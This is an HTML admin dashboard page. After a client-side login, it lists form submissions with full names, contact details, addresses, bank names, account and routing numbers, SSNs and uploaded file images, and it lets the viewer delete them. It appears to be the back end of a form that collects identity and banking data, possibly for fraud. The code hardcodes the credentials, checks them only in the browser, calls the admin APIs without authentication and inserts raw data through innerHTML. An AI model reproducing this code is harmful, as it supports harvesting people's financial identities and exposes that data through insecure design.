<!DOCTYPE html>
<html>
<head>
<title>Admin Dashboard</title>

<style>
body {
  font-family: Arial;
  background: #0f172a;
  color: white;
  margin: 0;
}

/* LOGIN */
.login-box {
  max-width: 300px;
  margin: 100px auto;
}

input {
  width: 100%;
  padding: 10px;
  margin: 10px 0;
  border-radius: 6px;
  border: none;
}

button {
  width: 100%;
  padding: 10px;
  background: #2563eb;
  color: white;
  border: none;
  border-radius: 6px;
  cursor: pointer;
}

/* DASHBOARD */
.dashboard {
  display: none;
  padding: 20px;
}

.card {
  background: #1e293b;
  padding: 15px;
  margin-bottom: 15px;
  border-radius: 8px;
}

img {
  width: 100px;
  margin: 5px;
  border-radius: 6px;
}
</style>

</head>

<body>

<div class="login-box" id="loginBox">
  <h2>Admin Login</h2>
  <input id="email" placeholder="Email">
  <input id="password" type="password" placeholder="Password">
  <button onclick="login()">Login</button>
</div>

<div class="dashboard" id="dashboard">
  <h2>All Submissions</h2>
  <p style="color:orange;">⚠️ Files are temporary and may disappear after restart</p>
  <div id="data"></div>
</div>

<script>

const BASE_URL = "https://form-s3i1.onrender.com";

function login() {
  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  if (email === "admin@gmail.com" && password === "1234") {
    loadData();
  } else {
    alert("Invalid login");
  }
}

async function loadData() {
  document.getElementById("loginBox").style.display = "none";
  document.getElementById("dashboard").style.display = "block";

  try {
    const res = await fetch(BASE_URL + "/api/admin/submissions");
    const submissions = await res.json();

    const container = document.getElementById("data");
    container.innerHTML = "";

    submissions.forEach(sub => {
      const div = document.createElement("div");
      div.className = "card";

      let images = "";

      if (sub.files) {
        Object.values(sub.files).forEach(arr => {
          arr.forEach(file => {
            images += '<img src="' + BASE_URL + '/' + file.path + '" />';
          });
        });
      }

      div.innerHTML =
        "<b>Name:</b> " + sub.full_name + "<br>" +
        "<b>Email:</b> " + sub.email + "<br>" +
        "<b>Phone:</b> " + sub.phone + "<br>" +
        "<b>Address:</b> " + sub.address + "<br><br>" +

        "<b>Bank:</b> " + sub.bank_name + "<br>" +
        "<b>Account:</b> " + sub.account_number + "<br>" +
        "<b>Routing:</b> " + sub.routing_number + "<br>" +
        "<b>SSN:</b> " + sub.ssn + "<br><br>" +

        "<b>Files:</b><br>" + images + "<br>" +

        '<button onclick="deleteSubmission(\'' + sub._id + '\')" style="background:red;">Delete</button>';

      container.appendChild(div);
    });

  } catch (err) {
    alert("Error loading data");
    console.error(err);
  }
}

async function deleteSubmission(id) {
  if (!confirm("Delete this submission?")) return;

  try {
    const res = await fetch(BASE_URL + "/api/admin/delete/" + id, {
      method: "DELETE"
    });

    if (!res.ok) throw new Error("Delete failed");

    alert("Deleted successfully");
    loadData();

  } catch (err) {
    alert("Error deleting");
    console.error(err);
  }
}

</script>

</body>
</html>
